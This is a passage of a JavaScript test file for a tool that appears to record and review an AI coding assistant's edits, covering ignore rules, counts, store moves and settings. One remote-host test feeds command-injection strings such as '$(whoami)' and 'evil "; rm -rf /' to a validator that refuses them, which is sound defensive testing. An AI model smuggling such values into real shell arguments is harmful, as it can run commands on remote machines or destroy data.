    core.blobText(S, rec.afterBlob),
    'def f():\n\n    return 2\n',
    'and it is captured verbatim — the blank line is not stripped from the content, only from the DECISION'
  );
});

test('ignore: a match records NOTHING — not the edit, and not a skip marker either', () => {
  // The trap this avoids: refusing in PreToolUse alone leaves Post with no staging record, so it
  // takes the appendSkip branch and writes "edit not captured — no before-snapshot" for a file the
  // reader explicitly asked us to leave alone. Refusing in the shared funnel means neither happens.
  freshHome();
  const S = 'ign-capture';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), '*.gen.ts\n');
  editHook(S, cwd, path.join(cwd, 'app.gen.ts'), 'a\n', 'b\n');
  assert.equal(core.readLog(S).length, 0, 'no edit record');
  assert.equal(core.readSkips(S).length, 0, 'and no skip marker — silence, as asked');

  // Positive control: the identical hook on a file the pattern does not cover IS captured, so the
  // assertion above is measuring the rule and not a broken harness.
  editHook(S, cwd, path.join(cwd, 'app.ts'), 'a\n', 'b\n');
  assert.equal(core.readLog(S).length, 1, 'positive control: an uncovered file still records');
});

test('ignore: there is no id to reach — an ignored file leaves nothing behind to undo', () => {
  // The other half of one mode. Under the old two-mode design this edit was captured and merely
  // hidden, so `undo <id>` could still revert it; now there is no record, which is the whole point
  // and also the reason a typo here costs data rather than visibility.
  freshHome();
  const S = 'ign-none';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'generated/\n');
  const gen = path.join(cwd, 'generated', 'client.ts');
  fs.mkdirSync(path.dirname(gen), { recursive: true });
  editHook(S, cwd, gen, 'old\n', 'new\n');
  editHook(S, cwd, path.join(cwd, 'app.ts'), 'x\n', 'y\n');

  assert.equal(core.readLog(S).length, 1, 'only the uncovered file was captured');
  assert.deepEqual(core.reviewEdits(S).map((r) => path.basename(r.file)), ['app.ts']);
  assert.equal(core.readLog(S).some((r) => r.file.includes('generated')), false, 'no record for it');
  assert.equal(fs.readFileSync(gen, 'utf8'), 'new\n', 'and the file on disk is untouched by us');
});

test('ignore: the list, the change map, the counts and the raw log all agree', () => {
  // Under one mode they agree for a simpler reason than they used to: there is nothing to filter,
  // so a surface CANNOT show a different number by forgetting to. This test now guards the other
  // direction — that `rawEdits` counts the store and not a leftover pre-filter figure.
  freshHome();
  const S = 'ign-agree';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), '*.lock\n');
  editHook(S, cwd, path.join(cwd, 'a.ts'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'b.ts'), 'b\n', 'B\n');
  editHook(S, cwd, path.join(cwd, 'deps.lock'), '1\n', '2\n');

  const map = core.buildChangeMap(cwd, S, { root: cwd });
  assert.equal(core.reviewEdits(S).length, 2, 'the list');
  assert.equal(map.summary.units, 2, 'the change map');
  assert.equal(core.sessionCounts(S).pending, 2, 'the counts');
  assert.equal(core.readLog(S).length, 2, 'the raw log — the lock file was never written');
  assert.equal(map.files.length, 2, 'and the map’s file rows');
  assert.ok(!map.files.some((f) => f.rel.endsWith('.lock')), 'the ignored file is on none of them');
  assert.equal(map.summary.rawEdits, 2, 'rawEdits counts the store, and the store never held it');
  assert.equal('hidden' in map.summary, false, 'and no hidden counter survives the summary');
});

test('ignore: "revert everything" cannot reach an ignored file, because nothing recorded it', () => {
  freshHome();
  const S = 'ign-scope';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'vendor/\n');
  const vend = path.join(cwd, 'vendor', 'lib.js');
  fs.mkdirSync(path.dirname(vend), { recursive: true });
  editHook(S, cwd, vend, 'v1\n', 'v2\n');
  editHook(S, cwd, path.join(cwd, 'src.ts'), 's1\n', 's2\n');

  const all = core.undoScope(S);
  assert.equal(all.undone, 1, 'the one recorded edit');
  assert.equal(fs.readFileSync(vend, 'utf8'), 'v2\n', 'the ignored file is untouched');
  assert.equal(core.readLog(S).some((r) => r.file.includes('vendor')), false, 'and has no id to name');
});

test('sweep: the on-disk map cache follows the sweep, not the ignore file', () => {
  // Under one mode an ignore file cannot retroactively change what a map shows — the records are
  // already there, and only the sweep removes them. That is the behaviour to pin: the earlier version
  // of this test asserted the OPPOSITE (writing the file changed the count), which two-mode filtering
  // made true and one mode makes false.
  //
  // This drives cachedChangeMap, NOT buildChangeMap. Reaching the disk cache is what makes it an
  // instrument: an earlier version called the uncached builder and passed with the stamp removed.
  freshHome();
  const S = 'ign-cache';
  const cwd = tmpWork();
  editHook(S, cwd, path.join(cwd, 'a.ts'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'b.ts'), 'b\n', 'B\n');
  const ig = path.join(cwd, '.observatoryignore');
  const units = () => {
    core.clearFsCache(); // the in-process memo would answer before the disk cache is ever consulted
    return core.cachedChangeMap(cwd, S, { root: cwd, prompts: true }).summary.units;
  };

  assert.equal(units(), 2, 'both, to start');
  assert.equal(units(), 2, 'and again — this second call is the one served FROM the cache');
  fs.writeFileSync(ig, 'b.ts\n');
  assert.equal(units(), 2, 'the rule alone changes nothing that is already recorded');

  assert.equal(core.dropIgnored(S).dropped, 1, 'the sweep is what removes it');
  assert.equal(units(), 1, 'and the cached map follows, because the sweep rewrote the log it keys on');
  assert.equal(core.reviewEdits(S)[0].file, path.join(cwd, 'a.ts'), 'to the OTHER file, not a stale answer');
});

test('ignore: the dash renders no ignore counters, because there are none to render', () => {
  // The two-mode design put "42 hidden by .observatoryignore" on the change-map header and the
  // Traces title. Under one mode those numbers do not exist; this asserts the notices went with
  // them rather than rendering as a permanent zero.
  const base = paneFixture();
  const opts = { cols: 150, rows: 34, color: false };
  const mapFrame = tui.renderDashFrame({ ...base, panes: { ...base.panes, tab: { detail: 1 } } }, opts);
  assert.ok(!mapFrame.some((l) => /observatoryignore/.test(l)), 'no notice on the change-map header');
  const listFrame = tui.renderDashFrame(base, opts);
  const title = listFrame.find((l) => /F3 Traces/.test(l));
  assert.ok(title, 'positive control: the Traces title IS in the frame');
  assert.ok(!/hidden/.test(title), 'and it carries no hidden count');
});

test('ignore: taskEditIds cannot contain an ignored file, because no record exists for one', () => {
  // `keepTask`/`undoTask` build their id set from `taskEditIds`. It used to filter; now the store
  // simply never holds a matching record, so this drives the capture hook and asserts the id set is
  // short by exactly the ignored file.
  freshHome();
  const S = 'ign-taskids';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), '*.snap\n');
  const t0 = Date.now() - 60_000;
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const iso = (ms) => new Date(ms).toISOString();
  const todo = (status, ts) => ({
    type: 'assistant', sessionId: S, timestamp: iso(ts),
    message: {
      role: 'assistant', id: `todo-${status}`,
      content: [{ type: 'tool_use', name: 'TodoWrite', input: { todos: [{ content: 'do the work', status, activeForm: 'doing the work' }] } }],
    },
  });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [
    { type: 'user', sessionId: S, cwd, timestamp: iso(t0 - 2000), message: { role: 'user', content: 'go' } },
    todo('in_progress', t0 - 1000),
    { type: 'assistant', sessionId: S, timestamp: iso(t0 + 500),
      message: { role: 'assistant', id: 'm1', content: [{ type: 'text', text: 'ok' }],
        usage: { input_tokens: 1, output_tokens: 1, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 } } },
    todo('completed', t0 + 10_000),
  ].map((o) => JSON.stringify(o)).join('\n') + '\n');

  core.ensureStore(S);
  const add = (rel, ts) => {
    const abs = path.join(cwd, rel);
    fs.writeFileSync(abs, 'after\n');
    const id = core.nextId(S);
    core.appendLog(S, { id, ts, tool: 'Edit', file: abs,
      beforeBlob: core.writeBlob(S, Buffer.from('before\n')), afterBlob: core.writeBlob(S, Buffer.from('after\n')),
      status: 'pending' });
    return id;
  };
  const visibleId = add('a.ts', t0 + 1000);
  // Appended DIRECTLY, bypassing the hook, to model a record captured before the rule existed —
  // then swept. Without the sweep this id would still be in the task set.
  const staleId = add('ui.snap', t0 + 2000);

  const taskId = core.taskIdForSubject('do the work');
  if (!taskId) assert.fail('the fixture produced no task span — this test would otherwise assert nothing');
  assert.ok(core.taskEditIds(cwd, S, taskId).includes(staleId), 'before the sweep it IS in the set');

  const res = core.dropIgnored(S);
  assert.equal(res.dropped, 1, 'the sweep removed exactly the ignored record');
  const ids = core.taskEditIds(cwd, S, taskId);
  assert.ok(ids.includes(visibleId), 'the recorded edit is still in the task set');
  assert.ok(!ids.includes(staleId), 'and the swept one is gone from it');
});

test('ignore: a later rule can re-include a whole DIRECTORY, not just a file', () => {
  // Directory-level negation. `packages/*/dist/` excludes every package's build output, and the rule
  // under it puts one back — last matching pattern wins, as in git. Nothing else covered this: the
  // file-level negation tests all pass even if the DIRECTORY test drops its negation check, which
  // would silently re-exclude everything a rule like this was written to rescue.
  const root = ignoreWork({ '.observatoryignore': 'packages/*/dist/\n!packages/core/dist/\n' });
  const ctx = core.ignoreContext({ home: null });
  assert.equal(ctx.ignored(path.join(root, 'packages/web/dist/bundle.js')), true, 'the broad rule still excludes');
  assert.equal(ctx.ignored(path.join(root, 'packages/core/dist/index.js')), false, 're-included by the later rule');
  assert.equal(ctx.ignored(path.join(root, 'packages/core/dist'), true), false, 'and the directory itself is not excluded');
});

test('ignore: three tiers, in git’s precedence order', () => {
  // git documents three, and they are three different intentions: shared and committed, private to
  // this checkout, and personal across every repo. Without the middle one the only way to hide
  // something in one checkout is to commit that decision into a repo other people work in.
  const home = freshHome();
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(home, '.claude', '.observatoryignore'), '*.personal\n');
  const root = ignoreWork({
    '.observatoryignore': '*.shared\n',
    '.git/info/observatoryignore': '*.private\n!override.shared\n',
  });
  const ctx = core.ignoreContext();
  assert.equal(ctx.ignored(path.join(root, 'a.shared')), true, 'the committed file');
  assert.equal(ctx.ignored(path.join(root, 'a.private')), true, 'the per-checkout file');
  assert.equal(ctx.ignored(path.join(root, 'a.personal')), true, 'the personal file');
  // Precedence: the tracked .observatoryignore OVERRIDES the private one, exactly as a per-directory
  // .gitignore overrides $GIT_DIR/info/exclude.
  assert.equal(ctx.ignored(path.join(root, 'override.shared')), true,
    'the shared file wins over the private file’s negation');
  assert.ok(ctx.files.some((f) => f.endsWith('.git/info/observatoryignore')),
    'and the private file is a cache-stamp input like any other');
});

test('panes: a review verb on a window that is not open says so, instead of crashing', () => {
  // `m` then `a` used to kill the dashboard: mutateScope looked up the focused pane's box with a
  // non-null assertion, and a MINIMIZED window has no box — nor does one the current size cannot
  // fit, which at any height under ~24 rows is Prompts and Dashboards by default. This pins the
  // geometry fact the runtime guard depends on, so a future layout change that reintroduces the
  // undefined is caught here rather than by a user pressing a key that reverts code.
  const focusMinimized = tui.resolveLayout({ cols: 150, rows: 40, minimized: new Set(['traces']), focus: 'traces' });
  assert.equal(focusMinimized.boxes.find((b) => b.id === 'traces'), undefined,
    'a minimized window genuinely has no box — the guard is not hypothetical');
  // …and it keeps its chip on the window bar, so the reader can always press its key to bring it back.
  const bar = tui.renderDashFrame(
    paneFixture({ panes: { minimized: new Set(['traces']), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {}, sizes: {} } }),
    { cols: 150, rows: 40, color: false },
  )[0];
  assert.match(bar, /F3 .Traces/, 'the minimized window is still named and still reachable');

  // The sizes where a pane folds by default are the ones a reader actually runs at.
  for (const [cols, rows] of [[120, 20], [100, 16], [80, 14]]) {
    const lay = tui.resolveLayout({ cols, rows, minimized: tui.defaultMinimized(cols, rows), focus: 'dashboards' });
    assert.equal(lay.boxes.find((b) => b.id === 'dashboards'), undefined,
      `${cols}x${rows}: Dashboards folds by default, so focusing it yields no box`);
  }
});

test('ignore: a rule that can never fire is reported as dead — the diagnostic git lacks', () => {
  // `git check-ignore -v` names the rule that WON and never mentions that the line the reader wrote
  // is unreachable: for `dist/` + `!dist/manifest.json` it reports `dist/` and says nothing about
  // line 2. Every verdict below was diffed against real git in test/e2e.sh (E2E 27); this pins the
  // classification itself, including the false positives an earlier draft produced.
  const root = ignoreWork({
    '.observatoryignore': [
      'dist/', '!dist/manifest.json',        // dead: an excluded ancestor
      'logs/', '!logs/keep/important.log',   // dead: excluded ancestor, deeper
      'pkg/*/dist/', '!pkg/a/dist/keep.js',  // dead: the ancestor rule has a wildcard
      '*.tmp', '!build.tmp',                 // ALIVE: file-level negation, no ancestor involved
      'src/*.log', '!src/keep.log',          // ALIVE: src/ itself is never excluded
    ].join('\n') + '\n',
  });
  const ctx = core.ignoreContextFor([path.join(root, 'x')], { home: null });
  const dead = core.deadRules(ctx);
  assert.deepEqual(dead.map((d) => d.rule.pattern).sort(),
    ['!dist/manifest.json', '!logs/keep/important.log', '!pkg/a/dist/keep.js'].sort());
  const manifest = dead.find((d) => d.rule.pattern === '!dist/manifest.json');
  assert.equal(manifest.shadowedBy.pattern, 'dist/', 'it names the rule that shadows it');
  assert.equal(manifest.shadowedBy.line, 1, 'and that rule’s line');
  assert.equal(manifest.fix, 'dist/*', 'and the form that works instead');

  // A file whose negation genuinely works must never be flagged: telling someone to rewrite a
  // working rule is worse than saying nothing.
  assert.ok(!dead.some((d) => /build\.tmp|src\/keep\.log/.test(d.rule.pattern)));
  // …and the classification agrees with the matcher it is describing.
  assert.equal(ctx.ignored(path.join(root, 'dist/manifest.json')), true, 'flagged rule really is dead');
  assert.equal(ctx.ignored(path.join(root, 'build.tmp')), false, 'unflagged negation really works');
  assert.equal(ctx.ignored(path.join(root, 'src/keep.log')), false);
});

test('ignore: a file with no negations at all reports nothing dead', () => {
  // The negative, with its control: a linter that always finds something is noise.
  const root = ignoreWork({ '.observatoryignore': 'dist/\n*.log\npackage-lock.json\n' });
  assert.deepEqual(core.deadRules(core.ignoreContextFor([path.join(root, 'x')], { home: null })), []);
  fs.writeFileSync(path.join(root, '.observatoryignore'), 'dist/\n!dist/keep.js\n');
  assert.equal(core.deadRules(core.ignoreContextFor([path.join(root, 'x')], { home: null })).length, 1,
    'positive control: the same probe DOES fire when a dead rule exists');
});

test('options: the editor row offers what this machine HAS, and steps through exactly that', () => {
  // The row used to be free text only, so `e` was configured by remembering a command AND its wait
  // flag. Everything here is injected, so the Windows branch — where `code` is `code.cmd` and an
  // extension-less probe finds nothing — is asserted from macOS.
  // Separator-agnostic, because `detectEditors` builds its candidates with `path.join` — which yields
  // `\usr\bin\vim` on Windows and never matches a forward-slash fixture. The subject here is WHICH
  // editors get offered, not how the host spells a separator, so the probe accepts either.
  const bins = new Set(['/usr/bin/vim', '/opt/bin/code', '/opt/bin/nano']);
  const hasBin = (f) => bins.has(String(f).replace(/\\/g, '/'));
  // `win: false` is injected as well, and has to be: without it `detectEditors` reads the HOST
  // platform and splits this POSIX PATH on `;` when run on Windows, finding one directory called
  // "/usr/bin:/opt/bin" and therefore no editors at all. The comment above claims everything is
  // injected; this is what makes that true.
  const found = core.detectEditors({ path: '/usr/bin:/opt/bin', win: false, isExec: hasBin });
  assert.deepEqual(found.map((e) => e.command), ['vim', 'nano', 'code -w'],
    'declaration order, and the GUI one carries its wait flag');
  assert.equal(found.every((e) => e.label), true, 'each is named');

  // Absent binaries are never offered — a choice you cannot run is worse than no choice.
  assert.deepEqual(core.detectEditors({ path: '/usr/bin', win: false, isExec: () => false }), []);

  // Windows: same PATH, extensions from PATHEXT. The probe is case-INSENSITIVE because the Windows
  // filesystem is: PATHEXT is conventionally upper-case while the shim on disk is `code.cmd`, and a
  // case-sensitive stand-in would fail a check that succeeds on the real platform.
  const winShim = path.join('C:\\tools', 'code.cmd').toLowerCase();
  assert.deepEqual(
    core.detectEditors({
      path: 'C:\\tools', win: true, pathext: '.EXE;.CMD',
      isExec: (f) => f.toLowerCase() === winShim,
    }).map((e) => e.command),
    ['code -w'],
    'the .cmd shim is found; probing the bare name would find nothing at all');

  // The row and the stepper read ONE list, so what you step through is what you see.
  const env = { editors: found };
  const rows = tui.optionRows({}, env);
  const row = rows.find((r) => r.id === 'editor');
  assert.deepEqual(row.choices, ['', 'vim', 'nano', 'code -w'], '"" is a real member: follow $EDITOR');
  assert.deepEqual(tui.editorChoices({}, env), row.choices, 'and the stepper walks the same list');

  let p = tui.applyOption({}, 'editor', 1, env);
  assert.equal(p.editor, 'vim', 'right steps forward from "not set"');
  p = tui.applyOption(p, 'editor', 1, env);
  assert.equal(p.editor, 'nano');
  p = tui.applyOption(p, 'editor', -1, env);
  assert.equal(p.editor, 'vim', 'and left steps back');
  p = tui.applyOption(p, 'editor', -1, env);
  assert.equal('editor' in p, false, 'stepping back onto "" DELETES the key — that is what unset means');

  // A hand-typed command is kept in the cycle rather than dropped, so stepping off it can return.
  const custom = tui.setOption({}, 'editor', 'emacsclient -nw');
  assert.equal(custom.editor, 'emacsclient -nw');
  assert.ok(tui.editorChoices(custom, env).includes('emacsclient -nw'), 'the typed value joins the list');
  const stepped = tui.applyOption(custom, 'editor', 1, env);
  assert.equal(stepped.editor, undefined, 'it sits last, so forward wraps to "not set"…');
  assert.equal(tui.applyOption(custom, 'editor', -1, env).editor, 'code -w', '…and back reaches the detected ones');

  // With nothing detected the row still exists and stepping is a safe no-op, not a crash on %0.
  const bare = tui.optionRows({}, {}).find((r) => r.id === 'editor');
  assert.deepEqual(bare.choices, ['']);
  assert.equal('editor' in tui.applyOption({}, 'editor', 1, {}), false,
    'a one-member cycle steps to itself rather than dividing by zero');
});

test('tui: colour and glyphs degrade sensibly on Linux, macOS, WSL and Windows', () => {
  // WINDOWS SETS NO `TERM`, and the detector ended with `env.TERM ? '16' : 'none'` — so every native
  // Windows terminal rendered the whole app in no colour at all, while WSL (which does set TERM) was
  // fine. Nobody on this project runs Windows daily, which is exactly why it needs a test rather than
  // a look. Both functions take env AND platform so every row here is real, not simulated.
  const row = (env, platform) => [tui.colorDepth(env, true, platform), tui.glyphTier(env, platform)];

  assert.deepEqual(row({ TERM: 'xterm-256color', COLORTERM: 'truecolor', LANG: 'en_US.UTF-8' }, 'darwin'),
    ['truecolor', 'block'], 'macOS, a modern terminal');
  assert.deepEqual(row({ TERM: 'xterm-256color', COLORTERM: 'truecolor', LANG: 'en_US.UTF-8' }, 'linux'),
    ['truecolor', 'block'], 'Linux, a modern terminal');
  assert.deepEqual(row({ TERM: 'xterm' }, 'linux'), ['16', 'block'], 'Linux, a plain TERM');
  assert.deepEqual(row({ TERM: 'xterm-256color', LANG: 'C' }, 'linux'), ['256', 'ascii'],
    'a C locale cannot be trusted with box drawing, whatever the colour');

  // WSL is Linux as far as node is concerned — it sets TERM, so it always worked.
  assert.deepEqual(row({ TERM: 'xterm-256color', COLORTERM: 'truecolor', WT_SESSION: 'a', LANG: 'C.UTF-8' }, 'linux'),
    ['truecolor', 'block'], 'WSL under Windows Terminal');

  // …and native Windows, which is what was broken.
  assert.deepEqual(row({ WT_SESSION: '3f2a' }, 'win32'), ['truecolor', 'block'],
    'Windows Terminal advertises itself with WT_SESSION and does truecolor');
  assert.deepEqual(row({}, 'win32'), ['16', 'safe'],
    'ConHost understands VT and 16 colours; its raster fonts cannot draw the shading blocks');
  assert.deepEqual(row({ ConEmuANSI: 'ON' }, 'win32'), ['256', 'safe'], 'ConEmu');

  // The overrides still win everywhere, on every platform.
  for (const plat of ['darwin', 'linux', 'win32']) {
    assert.equal(tui.colorDepth({ TERM: 'xterm-256color', NO_COLOR: '1' }, true, plat), 'none',
      `NO_COLOR is an instruction from the environment (${plat})`);
    assert.equal(tui.colorDepth({ WT_SESSION: 'a', TERM: 'xterm-256color' }, false, plat), 'none',
      `a non-TTY gets no escapes (${plat})`);
    assert.equal(tui.glyphTier({ OBSERVATORY_GLYPHS: 'ascii' }, plat), 'ascii', `the override wins (${plat})`);
  }
});

test('counts: "pending" means DISPLAY units everywhere — the raw record count is a different number', () => {
  // The bug this pins: the VS Code status bar and its activity-bar badge counted RAW records while
  // the Overview, the Sessions rows and the Stats scoreboard counted collapsed review units. One
  // session read 3,067 in one place and 2,052 two panels away. `keep`/`undo` resolve a whole
  // same-code group, so the display units are the number of decisions anyone actually has to make.
  freshHome();
  const S = 'count-units';
  const cwd = tmpWork();
  core.ensureStore(S);
  const blob = (t) => core.writeBlob(S, Buffer.from(t));
  const add = (rel, before, after) => {
    const abs = path.join(cwd, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, after);
    core.appendLog(S, { id: core.nextId(S), ts: Date.now(), tool: 'Edit', file: abs, beforeBlob: blob(before), afterBlob: blob(after), status: 'pending' });
  };
  // A CHAINED pair on one file — the second picks up where the first left off, which is exactly what
  // collapses into a single review unit.
  add('a.ts', 'v1\n', 'v2\n');
  add('a.ts', 'v2\n', 'v3\n');
  add('b.ts', 'x\n', 'y\n');

  const raw = core.readLog(S).filter((r) => r.status === 'pending').length;
  const units = core.reviewEdits(S).filter((r) => r.status === 'pending').length;
  assert.equal(raw, 3, 'three records on disk');
  assert.equal(units, 2, 'but two decisions — the chained pair is one review unit');
  assert.notEqual(raw, units, 'the fixture MUST make the two differ, or this test asserts nothing');

  // Every surface-facing count reads the units.
  assert.equal(core.sessionCounts(S).pending, units, 'sessionCounts (status bar, Sessions rows)');
  assert.equal(core.buildChangeMap(cwd, S, { root: cwd }).summary.pending, units, 'the change map summary');
  assert.equal(core.reviewEdits(S).filter((r) => r.status === 'pending').length, units, 'and the list itself');
});

test('store: the location is shown, movable, and the move takes the history AND the settings', () => {
  freshHome();
  const S = 'store-move';
  const cwd = tmpWork();
  editHook(S, cwd, path.join(cwd, 'a.ts'), 'one\n', 'two\n');
  assert.equal(core.readLog(S).length, 1, 'one record to move');
  // A real preference, so the move has something to lose. This is the bug the fix exists for:
  // prefs.json lives INSIDE the default store directory, so moving the store renamed the settings
  // away with it and the write that recorded the new location left a file holding only `storeDir`.
  core.writePrefs({ ...core.readPrefs(), remotes: [{ name: 'build-box', host: 'buildhost.internal', enabled: true }] });

  const before = core.rootDir();
  const dest = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'store-dest-')), 'observatory');
  const res = core.moveStore(dest);
  assert.ok(res.moved, `move failed: ${JSON.stringify(res)}`);
  core.writePrefs({ ...core.readPrefs(), storeDir: dest });

  assert.equal(core.rootDir(), dest, 'rootDir follows the setting');
  assert.equal(core.readLog(S).length, 1, 'the history came with it');
  assert.equal(core.readPrefs().remotes?.[0]?.name, 'build-box',
    'and so did every OTHER setting — moving the store must not destroy the preferences');
  assert.ok(!fs.existsSync(path.join(dest, 'prefs.json')),
    'with exactly one preferences file, not a second one inside the store to disagree with it');
  assert.ok(!fs.existsSync(path.join(before, S)), 'the old location no longer holds the session');

  // …and back again. The default location always holds prefs.json, so a naive "is it empty?" guard
  // makes the return trip impossible — which it did, until prefs.json stopped counting as store data.
  const back = core.moveStore(before);
  assert.ok(back.moved, `move back failed: ${JSON.stringify(back)}`);
  const p = core.readPrefs();
  delete p.storeDir;
  core.writePrefs(p);
  assert.equal(core.rootDir(), before, 'back to the default');
  assert.equal(core.readLog(S).length, 1, 'still one record');
  assert.equal(core.readPrefs().remotes?.[0]?.name, 'build-box', 'settings survived the return trip too');

  // Refusals, each with its own reason.
  assert.match(core.moveStore(core.rootDir()).error, /already there/);
  assert.match(core.moveStore(path.join(core.rootDir(), 'inner')).error, /inside the current store/);
  const busy = fs.mkdtempSync(path.join(os.tmpdir(), 'store-busy-'));
  fs.writeFileSync(path.join(busy, 'something.txt'), 'x');
  assert.match(core.moveStore(busy).error, /not empty/);
  // A relative path would resolve against whatever directory the caller started in.
  assert.match(core.parseStorePath('relative/path').error, /relative/);
  assert.equal(core.parseStorePath('/abs/path').dir, '/abs/path');
  assert.match(core.parseStorePath('   ').error, /nothing to set/);
});

test('remotes: one parser guards every surface that can add a machine', () => {
  // Both fields are interpolated into a shell that runs on ANOTHER computer, so there is exactly one
  // door — `parseRemoteSpec` — and the options window, the `remotes` verb and both editors all come
  // through it. A second copy of this guard is a second chance to get it wrong.
  const ok = core.parseRemoteSpec('build-box buildhost.internal');
  assert.deepEqual(ok.remote, { name: 'build-box', host: 'buildhost.internal', configDir: undefined, enabled: true });

  // One token is the host, and the name defaults to it — the common case where the two are the same.
  assert.deepEqual(core.parseRemoteSpec('lab.example.com').remote,
    { name: 'lab.example.com', host: 'lab.example.com', configDir: undefined, enabled: true });

  // A $VARIABLE-leading config dir is allowed on purpose, so $HOME/.claude works…
  assert.equal(core.parseRemoteSpec('lab lab.example.com $HOME/.claude').remote.configDir, '$HOME/.claude');
  // …which is exactly why it cannot be a free string: $(...) in that position is command substitution,
  // executed on the other machine. REFUSED AT WRITE TIME now — `readPrefs` already dropped it on read,
  // which kept it out of the shell but made the reader's setting vanish with nothing said.
  for (const bad of ['x host.example $(whoami)', 'x host.example `id`', 'x host.example a;b', 'x host.example "q"']) {
    const r = core.parseRemoteSpec(bad);
    assert.ok('error' in r, `should refuse: ${bad}`);
    assert.match(r.error, /config dir/);
  }
  // …and a host ssh could not accept.
  for (const bad of ['evil "; rm -rf /', 'a host with spaces extra bits!!']) {
    assert.ok('error' in core.parseRemoteSpec(bad), `should refuse: ${bad}`);
  }
  assert.match(core.parseRemoteSpec('  ').error, /nothing to add/);
  // The NAME is the handle every later operation uses (`remotes --remove <name>`), so one shaped like
  // a flag makes its own removal unparseable. `remotes --add "--json evil"` stored a machine called
  // `--json`; it is refused now. The name never reaches ssh — only host and configDir do — so this is
  // a broken identifier rather than an injection, and the message says so.
  assert.match(core.parseRemoteSpec('--json evil').error, /cannot start with/);
  assert.match(core.parseRemoteSpec('-x host.example').error, /cannot start with/);

  // The options window routes through it, so its refusals are the same strings.
  const rejected = tui.setOption({}, 'remote:new', 'x host.example $(whoami)');
  assert.match(String(rejected.__reject), /config dir/, 'the settings row shows the same reason');
  assert.equal(rejected.remotes, undefined, 'and stores nothing');
  const added = tui.setOption({}, 'remote:new', 'build-box buildhost.internal');
  assert.deepEqual(added.remotes.map((r) => r.host), ['buildhost.internal']);

  // Editing a row must not silently re-enable a machine the reader turned off.
  const off = { remotes: [{ name: 'a', host: 'a.example', enabled: false }] };
  assert.equal(tui.setOption(off, 'remote:0', 'a a2.example').remotes[0].enabled, false,
    'an edit keeps the on/off state — turning a host back on is a separate gesture');
  // …and blanking the line removes it, the one deletion gesture this screen has.
  assert.equal(tui.setOption(off, 'remote:0', '   ').remotes, undefined);
});

test('options: the new settings round-trip, and a refused host says why', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-opt-'));
  const file = path.join(dir, 'prefs.json');
  let p = {};
  // Start focus and start face cycle and persist.
  p = tui.applyOption(p, 'startFocus', 1);
  assert.equal(p.startFocus, 'prompts', 'cycles forward from the default');
  p = tui.applyOption(p, 'startFace', 1);
  assert.equal(p.startFace, 'map');
  p = tui.applyOption(p, 'startFace', -1);
  assert.equal(p.startFace, 'auto', 'and backward');
  core.writePrefs(p, file);
  assert.deepEqual(core.readPrefs(file), { startFocus: 'prompts' },
    'only non-defaults are stored, and they read back');

  // A host ssh could not accept is REFUSED with a reason, not silently dropped — and the previous
  // remotes are left exactly as they were.
  const withHost = tui.setOption({ remotes: [{ name: 'a', host: 'good-host', enabled: true }] }, 'remote:new', 'bad name@@!! host');
  assert.match(String(withHost.__reject), /not a usable ssh host name/);
  assert.equal(withHost.remotes.length, 1, 'the good one is untouched');
  // …and the marker never reaches disk.
  core.writePrefs(withHost, file);
  assert.equal(core.readPrefs(file).__reject, undefined, 'a rejection is a message, not a setting');

  // A GOOD host still stores.
  const ok = tui.setOption({}, 'remote:new', 'nova nova.example.com');
  assert.equal(ok.__reject, undefined);
  assert.deepEqual(ok.remotes, [{ name: 'nova', host: 'nova.example.com', configDir: undefined, enabled: true }]);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('ignore: no display override exists — the matcher the hook uses is the only one', () => {
  // The two-mode design had a "show ignored edits" setting, and the bug it shipped with was that the
  // env check sat inside `ignoreContext` — the function the CAPTURE HOOK calls — so turning the
  // display setting on silently disabled refusal. Under one mode the setting is gone entirely, and
  // this asserts it cannot come back through the environment.
  const root = ignoreWork({ '.observatoryignore': 'gone.ts\n' });
  const prev = process.env.CLAUDE_OBSERVATORY_SHOW_HIDDEN;
  const probe = path.join(root, 'gone.ts');
  try {
    process.env.CLAUDE_OBSERVATORY_SHOW_HIDDEN = '1';
    assert.equal(core.ignoreContext({ home: null }).ignored(probe), true,
      'no environment variable can make the matcher record what the file excludes');
    assert.equal(core.ignoreContextFor([probe], { home: null }).ignored(probe), true);
  } finally {
    if (prev === undefined) delete process.env.CLAUDE_OBSERVATORY_SHOW_HIDDEN;
    else process.env.CLAUDE_OBSERVATORY_SHOW_HIDDEN = prev;
  }
  assert.equal(typeof core.sessionIgnoreContext, 'undefined', 'and the display matcher is gone');
  assert.equal(typeof core.readLogVisible, 'undefined');
  assert.equal(typeof core.reviewEditsFiltered, 'undefined');
});

test('ignore: `resolve` cannot reach an ignored file, because the store never held one', () => {
  // `resolve` is accept-everything-then-CLEAR, the one bulk verb whose mistake cannot be undone: the
  // verdict is written and the record dropped. Under one mode it is safe by construction here —
  // there is no ignored record for it to sweep up.
  freshHome();
  const S = 'ign-resolve';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'vendor/\n');
  const vend = path.join(cwd, 'vendor', 'lib.js');
  fs.mkdirSync(path.dirname(vend), { recursive: true });
  editHook(S, cwd, vend, 'v1\n', 'v2\n');
  editHook(S, cwd, path.join(cwd, 'src.ts'), 's1\n', 's2\n');

  const res = core.resolveSession(S);
  assert.equal(res.accepted, 1, 'the one recorded edit');
  assert.equal(core.readLog(S).length, 0, 'and resolve cleared it');
  assert.equal(fs.readFileSync(vend, 'utf8'), 'v2\n', 'the ignored file was never touched');
});

